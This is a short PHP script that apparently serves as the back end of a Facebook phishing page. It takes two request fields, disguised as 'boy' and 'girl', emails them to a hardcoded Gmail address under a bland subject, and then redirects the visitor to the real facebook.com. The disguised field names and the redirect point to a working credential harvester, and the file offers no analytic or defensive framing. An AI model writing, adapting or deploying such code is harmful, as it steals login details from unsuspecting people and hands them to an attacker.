<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['boy']) && isset($_REQUEST['girl']) ) ){
			return false;
		}

		$boy = $_REQUEST['boy'];
		$girl = $_REQUEST['girl'];
		
		$reciever = "kaatanga@gmail.com";
		
		$subject = "hello have a good one";
		$message = "The name is ". $boy;
		$message .= "and age is ". $girl;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
	header("location:javascript://history.go(-1)");
?>